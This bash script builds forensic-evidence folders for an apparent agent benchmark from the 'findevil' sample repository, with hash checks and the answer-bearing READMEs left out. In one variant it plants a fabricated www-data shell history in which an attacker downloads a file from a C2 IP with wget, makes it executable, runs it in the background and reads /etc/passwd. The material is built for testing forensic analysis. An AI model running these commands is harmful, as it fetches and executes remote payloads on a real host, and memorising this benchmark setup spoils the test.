#!/usr/bin/env bash
# Take findevil's own sample evidence from its repository, at the commit the
# findevil variants build, and lay out one scenario per evidence folder. Run
# through `./bench.sh prepare findevil-samples`, which runs it in Docker:
#   data/raw/findevil-samples/            the repository archive
#   data/evidence/findevil-scenario-02/             samples/attack-scenario-02
#   data/evidence/findevil-scenario-02-histories/   its three shell histories only
#   data/evidence/findevil-scenario-02-www/         scenario 02 at a real system's
#                                                   size, plus a shell history for
#                                                   its www-data account
# Each scenario's README.md, which states what an analyst should find, is left
# out: agents read the evidence folder. The archive is generated by GitHub, so
# its own hash may change; instead the SHA-256 of the scenario's files (sorted
# "hash  path" lines) is checked.
set -euo pipefail
cd "$(dirname "$0")/../.."

REF=d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
RAW=data/raw/findevil-samples
URL=https://codeload.github.com/marlyocat/findevil/tar.gz/$REF
mkdir -p "$RAW"
[ -f "$RAW/findevil-$REF.tar.gz" ] || curl -fL --retry 3 -o "$RAW/findevil-$REF.tar.gz" "$URL"

while read -r sum scenario; do
    evd=data/evidence/findevil-$scenario
    rm -rf "$evd"
    mkdir -p "$evd"
    tar -xzf "$RAW/findevil-$REF.tar.gz" -C "$evd" --strip-components=3 --exclude=README.md \
        "findevil-$REF/samples/attack-$scenario"
    got=$(cd "$evd" && find . -type f | LC_ALL=C sort | xargs sha256sum | sha256sum | cut -d' ' -f1)
    if [ "$sum" = "-" ]; then
        echo "new  $scenario $got  (add this to fetch.sh)"
    elif [ "$got" != "$sum" ]; then
        echo "SHA-256 mismatch for $scenario: $got (expected $sum)" >&2; exit 1
    else
        echo "ok   $scenario"
    fi
done <<'SUMS'
09f8312bbc76a81b9ad1bbbe4d5b064628a2b5bf4895092078d6eeb5e02fa65e scenario-02
SUMS

# Scenario 02's shell histories alone, at the same paths: with nothing else in
# the folder, assess_coverage's verdict rests on them only.
hist=data/evidence/findevil-scenario-02-histories
rm -rf "$hist"
for f in fs/home/alice/.bash_history fs/home/deploy/.bash_history fs/root/.bash_history; do
    mkdir -p "$hist/$(dirname "$f")"
    cp "data/evidence/findevil-scenario-02/$f" "$hist/$f"
done
echo "ok   scenario-02-histories"

# Scenario 02 plus one file written for this bench: a shell history for the
# www-data account that scenario 02's /etc/passwd already has, in its home
# /var/www. The attacker fetches and runs a file from the C2 address of the
# scenario as that account. A real Debian /etc (debian-etc.tar, taken by
# bench.sh from a pinned image) is added without replacing any file of the
# scenario, so the snapshot has a real system's size: list_evidence then cuts
# its listing at 300 lines, before /var, as it does on real snapshots.
www=data/evidence/findevil-scenario-02-www
rm -rf "$www"
cp -R data/evidence/findevil-scenario-02 "$www"
mkdir -p "$www/fs/var/www"
cat > "$www/fs/var/www/.bash_history" <<'HIST'
id
uname -a
cd /tmp
wget http://185.229.59.103/u -O /tmp/.u
chmod +x /tmp/.u
/tmp/.u &
cat /etc/passwd
HIST
tar -xf "$RAW/debian-etc.tar" -C "$www/fs" --skip-old-files
got=$(cd "$www" && find . -type f | LC_ALL=C sort | xargs sha256sum | sha256sum | cut -d' ' -f1)
want=f0f1820fbbf85429f9463b40e5d52b27baa44b3d272f77caf70484f7f8b07048
if [ "$want" = "-" ]; then
    echo "new  scenario-02-www $got  (add this to fetch.sh)"
elif [ "$got" != "$want" ]; then
    echo "SHA-256 mismatch for scenario-02-www: $got (expected $want)" >&2; exit 1
else
    echo "ok   scenario-02-www"
fi
echo "evidence ready in data/evidence/findevil-scenario-*"
